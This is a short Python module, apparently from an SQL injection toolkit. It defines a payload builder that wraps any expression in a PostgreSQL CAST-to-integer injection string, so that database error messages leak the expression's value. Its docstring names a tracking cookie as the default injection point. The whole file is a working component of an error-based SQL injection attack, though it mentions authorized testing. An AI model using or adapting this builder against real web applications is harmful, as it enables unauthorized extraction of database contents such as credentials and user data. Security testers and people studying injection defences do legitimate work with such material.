"""Payloads for visible error-based extraction."""

from dataclasses import dataclass

from .contracts import PayloadBuilder


@dataclass(frozen=True, slots=True)
class PostgresCastPayloadBuilder(PayloadBuilder):
    """Render an expression as PostgreSQL ``integer`` to expose its value.

    The default wrapper is suitable for a value embedded in a quoted string,
    such as a tracking cookie.  Prefix and suffix are configurable for other
    authorized injection contexts while keeping SQL construction isolated.
    """

    prefix: str = "'||(SELECT CAST(("
    suffix: str = ") AS integer))||'-- "

    def __post_init__(self) -> None:
        if not self.prefix:
            raise ValueError("prefix cannot be empty")
        if not self.suffix:
            raise ValueError("suffix cannot be empty")

    def build(self, expression: str) -> str:
        if not expression.strip():
            raise ValueError("expression cannot be empty")
        return f"{self.prefix}{expression.strip()}{self.suffix}"
